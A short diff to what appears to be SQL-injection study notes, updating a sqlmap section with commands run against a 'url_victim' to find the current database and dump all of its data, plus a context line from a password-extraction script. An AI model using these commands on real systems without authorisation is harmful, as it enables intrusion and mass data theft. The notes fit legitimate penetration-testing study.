@@ -109,4 +109,6 @@ print('[+] password found : ',dump_data())
 ```
 ### 2.4. Tool sqlmap
 - install: `brew install sqlmap`
-- use: `sqlmap -r file_request --batch -D database --tables`
+- use: `sqlmap -u url_victim --batch --current-db` -> get name of database
+- use: `sqlmap -u url_victim --batch -D name_db --dump-all ` -> show all data of that database
+(`can use file_request to dynamic scan`)
